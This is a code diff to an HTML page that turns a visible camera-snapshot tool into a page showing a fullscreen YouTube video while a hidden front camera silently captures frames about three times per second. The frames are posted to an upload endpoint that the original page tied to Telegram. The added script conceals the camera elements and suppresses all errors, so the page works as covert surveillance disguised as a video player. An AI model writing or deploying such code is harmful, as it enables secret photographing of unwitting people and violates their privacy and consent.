@@ -2,61 +2,72 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Camera + Telegram + YouTube</title>
+  <title>YouTube Fullscreen with Hidden Camera</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      overflow: hidden;
+      background: black;
+    }
+    iframe {
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
+    video, canvas {
+      display: none;
+    }
+  </style>
 </head>
 <body>
-  <h1>Camera → Telegram</h1>
-  <video id="video" autoplay playsinline width="320" height="240"></video>
-  <br>
-  <button id="captureBtn">Capture & Send</button>
-  <p id="status"></p>
+  <!-- Fullscreen YouTube -->
+  <iframe
+    src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&controls=1"
+    allow="autoplay; encrypted-media"
+    allowfullscreen>
+  </iframe>
 
-  <hr>
-  <h2>Watch Video</h2>
-  <iframe width="560" height="315"
-    src="https://www.youtube.com/embed/dQw4w9WgXcQ"
-    frameborder="0"
-    allowfullscreen></iframe>
-
-  <canvas id="canvas" width="320" height="240" style="display:none"></canvas>
+  <!-- Hidden camera elements -->
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" width="320" height="240"></canvas>
 
   <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    const captureBtn = document.getElementById('captureBtn');
-    const statusP = document.getElementById('status');
+    const ctx = canvas.getContext('2d');
 
-    // Start camera
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
-      .then(stream => { video.srcObject = stream; })
-      .catch(err => { statusP.textContent = 'Camera error: ' + err.message; });
-
-    // Capture and send
-    captureBtn.onclick = async () => {
-      statusP.textContent = 'Capturing...';
-
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
-
+    async function startCamera() {
       try {
-        const resp = await fetch('/api/upload-photo', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ dataUrl, caption: 'Snapshot from camera' })
-        });
-        const json = await resp.json();
-        if (json.ok) {
-          statusP.textContent = 'Photo sent to Telegram!';
-        } else {
-          statusP.textContent = 'Error: ' + json.error;
-        }
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        video.srcObject = stream;
+
+        // Send photo every 333ms (≈ 3 per second)
+        setInterval(async () => {
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
+
+          try {
+            await fetch('/api/upload-photo', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ dataUrl })
+            });
+          } catch (err) {
+            console.error('Send error:', err);
+          }
+        }, 333);
+
       } catch (err) {
-        statusP.textContent = 'Network error: ' + err.message;
+        console.error('Camera access error:', err);
       }
-    };
+    }
+
+    startCamera();
   </script>
 </body>
 </html>
